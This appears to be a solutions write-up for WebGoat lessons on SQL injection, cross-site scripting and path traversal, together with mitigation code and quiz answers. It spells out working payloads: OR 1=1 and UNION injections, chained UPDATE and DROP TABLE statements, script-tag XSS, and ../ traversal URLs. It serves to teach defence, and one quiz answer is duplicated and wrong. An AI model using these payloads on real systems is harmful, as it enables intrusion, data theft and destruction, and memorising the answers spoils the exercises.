# SQL Injection (intro)

## What is SQL?

_Challenge_: retrieve the `department` of the employee **Bob Franco**.

_Solution_: `SELECT department FROM employees WHERE userid=96134`.

## Data Manipulation Language (DML)

_Challenge_: change the `department` of **Tobi Barnett** to `'Sales'`.

_Solution_: `UPDATE employees SET department='Sales' WHERE userid=89762`.

## Data Definition Language (DDL)

_Challenge_: modify the schema by adding the column `phone` _(varchar(20))_ to the table `employees`.

_Solution_: `ALTER TABLE employees ADD phone varchar(20)`.

## Data Control Language (DCL)

_Challenge_: grant rights to the table `grant_rights` to user `unauthorized_user`.

_Solution_: `GRANT ALL PRIVILEGES ON grant_rights TO unauthorized_user`.

## String SQL injection

_Challenge_: retrieve all the users from the users table using the query `"SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + lastName + "'";`.

_Solution_: **SELECT * FROM user_data WHERE first_name='John' AND last_name='** `Smith'` `or` `'1'='1` **'**

## Numeric SQL injection

_Challenge_: retrieve all the data from the users table using the form with query `"SELECT * FROM user_data WHERE login_count = " + Login_Count + " AND userid = "  + User_ID;`.

_Solution_:
- Login_Count: `1`.
- User_Id: `2 OR 1=1;--`.

## Compromising confidentiality with String SQL injection

_Challenge_: retrieve all employee data from the **employees** table using the form with query `"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "'";`.

_Solution_:
- Employee Name: `Smith' OR 1=1;--`.
- Authentication TAN: `anything`.

## Compromising Integrity with Query chaining

_Challenge_: change your own salary so you are earning the most. Your name is John **Smith** and your current TAN is **3SL99A**.

_Solution_:
- Employee Name: `'; UPDATE employees SET SALARY=700000 WHERE AUTH_TAN='3SL99A';--`.
- Authentication TAN: `anything`.

## Compromising Availability

_Challenge_: delete the **access_log** table, where all your actions have been logged to.

_Solution_: `'; DROP TABLE access_log; --`.

# SQL Injection (advanced)

## Pulling data from other tables

_Challenge_: retrieve all data from the tables below to find Dave's password.

```
CREATE TABLE user_data (userid int not null,
                        first_name varchar(20),
                        last_name varchar(20),
                        cc_number varchar(30),
                        cc_type varchar(10),
                        cookie varchar(20),
                        login_count int);
                        
CREATE TABLE user_system_data (userid int not null primary key,
			                   user_name varchar(12),
			                   password varchar(10),
			                   cookie varchar(30));
```

_Solution_:
- Name: `anything'; SELECT * FROM user_system_data;--`.
- Password: `passW0rD`.
- Alternative for Name: `' UNION SELECT userid,user_name, password, 'a', 'b', 'c', 1 from user_system_data --`.

## Quiz

___Q___: _What is the difference between a prepared statement and a statement?_

___A___: Solution 4: A statement includes actual values, whereas a prepared statement uses placeholders.

___Q___: _Which one of the following characters is a placeholder for variables?_

___A___: Solution 3: ?

___Q___: _How can prepared statements be faster than statements?_

___A___: Solution 2: Prepared statements are compiled once by the database management system and then reused with different inputs, reducing compilation overhead.

___Q___: _How do prepared statements help prevent SQL injection?_

___A___: Solution 2: Prepared statements are compiled once by the database management system and then reused with different inputs, reducing compilation overhead.

___Q___: _How do prepared statements help prevent SQL injection?_

___A___: Solution 3: Placeholders prevent user input from being directly appended to the SQL query, ensuring a clear separation between code and data.

___Q___: _What happens if a person with malicious intent enters the following input into a registration form that uses a prepared statement? Input: Robert); DROP TABLE Students;--_

___A___: Solution 4: The database treats the entire input as a plain string: Robert); DROP TABLE Students;-- without executing it as SQL.

# SQL Injection (mitigation)

## Writing safe code

_Challenge_: complete the code, so that it’s no longer vulnerable to a SQL injection.

_Solution_:

``` java
Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
PreparedStatement statement = conn.prepareStatement("SELECT status FROM users WHERE name=? AND mail=?");
statement.setString(1, "Tom");
statement.setString(2, "Tom@Webgoat.org");
```

_Challenge_: write your own code to connect to a database and request data from it.

_Solution_:

``` java
try {
    String query = "SELECT first_name, last_name, acct_id, balance FROM user_data WHERE acct_id = ?";
    Connection connection = DriverManager.getConnection(DBURL, DBUSER, DBPW);
    PreparedStatement statement = connection.prepareStatement(query);
    statement.setString(1, "96453");
    ResultSet results = statement.executeQuery();
} catch (Exception e) {
    System.out.println("Oops. Something went wrong!");
}
```

## Input validation alone is not enough

_Challenge_: the developer fixed the possible SQL injection with filtering, spot the weakness in this approach.

_Solution_: `anything';/**/SELECT/**/*/**/FROM/**/user_system_data;--`.

# Cross Site Scripting

## ## Reflected XSS

_Challenge_: identify which field is susceptible to XSS.

_Solution_:
- Enter your credit card number: `<script>alert();</script>`.
- Enter your three digit access code: `123`.

## Identify potential for DOM-Based XSS

_Challenge_: what is the route for the test code that stayed in the app during production.

_Solution_: look at `view/GoatRouter.js` and find the test route `start.mvc#test/`.

## DOM-Based XSS

_Challenge_: use the route you just found and see if you can use it to reflect a parameter from the route without encoding to execute an internal function in WebGoat. The function you want to execute is: **webgoat.customjs.phoneHome()**.

_Solution_: handler for test route is within `controller/LessonController.js` which calls `lessonContentView.showTestParam(param)`. Code for this function is `this.$el.find('.lesson-content').html('test:' + param);`.
Url to use is `http://localhost:8080/WebGoat/start.mvc?username=username#test/%3Cscript%3Ewebgoat.customjs.phoneHome()%3C%2Fscript%3E` which gives the random number `377753124` in the console.

## Quiz

___Q___: _Is a well known website, like Netflix, immune to XSS attacks?_

___A___: Solution 4: No, because the browser trusts the website if it is acknowledged trusted, then the browser does not know that the script is malicious.

___Q___: _When do XSS attacks occur?_

___A___: Solution 3: When a website fails to validate or sanitize user input, allowing malicious scripts to be executed in a user's browser.

___Q___: _What are Stored XSS attacks?_

___A___: Solution 1: The script is permanently stored on the server and the victim gets the malicious script when requesting information from the server.

___Q___: _What are Reflected XSS attacks?_

___A___: Solution 2: They reflect the injected script off the web server. That occurs when input sent to the web server is part of the response.

___Q___: _Is JavaScript the only way to perform XSS attacks?_

___A___: Solution 4: No, there are many other ways. Like HTML, Flash or any other type of code that the browser executes.

# Cross Site Scripting (stored)

_Challenge_: add a comment with a JavaScript payload(`webgoat.customjs.phoneHome`).

_Solution_: `<script>webgoat.customjs.phoneHome()</script>`. Random number is `912173590`.

# Cross Site Scripting (mitigation)

## Reflective XSS

_Challenge_: prevent XSS by escaping the URL parameters in the JSP file.

_Solution_: see [https://www.owasp.org/index.php/OWASP_Java_Encoder_Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)

``` html
<%@ taglib uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" prefix="e" %>
<html>
<head>
    <title>Using GET and POST Method to Read Form Data</title>
</head>
<body>
    <h1>Using POST Method to Read Form Data</h1>
    <table>
        <tbody>
            <tr>
                <td><b>First Name:</b></td>
                <td>${e:forHtml(param.first_name)}</td>
            </tr>
            <tr>
                <td><b>Last Name:</b></td>
                <td>${e:forHtml(param.last_name)}</td>
            </tr>
        </tbody>
    </table>
</body>
</html>
```

## Stored XSS

_Challenge_: prevent XSS by creating a clean string inside the saveNewComment() function. Use the "antisamy-slashdot.xml" as a policy file.

_Solution_: see [https://github.com/nahsra/antisamy](https://github.com/nahsra/antisamy)

***TBC***

# Path traversal

## Path traversal while uploading files

_Challenge_: overwrite a specific file on the file system (`<webgoat path>/PathTraversal`).

_Solution_: use update button to observe the full path of the file.

Full Name: `../anything`

## Path traversal while uploading files

_Challenge_: overwrite a specific file on the file system (`<webgoat path>/PathTraversal`) on a version with a fix implemented.

_Solution_: Use update button to observe the full path of the file. Try previous solution to observe fix.

Full Name: `....//anything`

## Path traversal while uploading files

_Challenge_: overwrite a specific file on the file system (`<webgoat path>/PathTraversal`) on a version with a fix implemented.

_Solution_: use update button to observe the full path of the file. Try previous solution to observe fix.

Full Name: `....//anything`

## Path traversal while uploading files

_Challenge_: overwrite a specific file on the file system (`<webgoat path>/PathTraversal`) on a version with a fix implemented.

_Solution_: use **Resend with Request Editor** and update the image path in the POST body to add `../`.

## Retrieving other files with a path traversal

_Challenge_: retrieve a file called `path-traversal-secret.jpg` from the system.

_Solution_: observe the GET request when pressing `Show random cat picture`. Use **Resend with Request Editor** and change the request URL to `http://localhost:8080/WebGoat/PathTraversal/random-picture?id=%2E%2E%2F%2E%2E%2Fpath-traversal-secret`. Secret is SHA-512 of username: `05ee170f46fd6040a23ebd883d63ef3b2aff55e3d6e01eccbc401088d7de0c153251c27e517ea4ad9bed62980366d1a47ceb312a659e77debda650d870094562`.

**Tip**: Use _Tools | Encode/Decode/Hash_ to encode path `../../`.
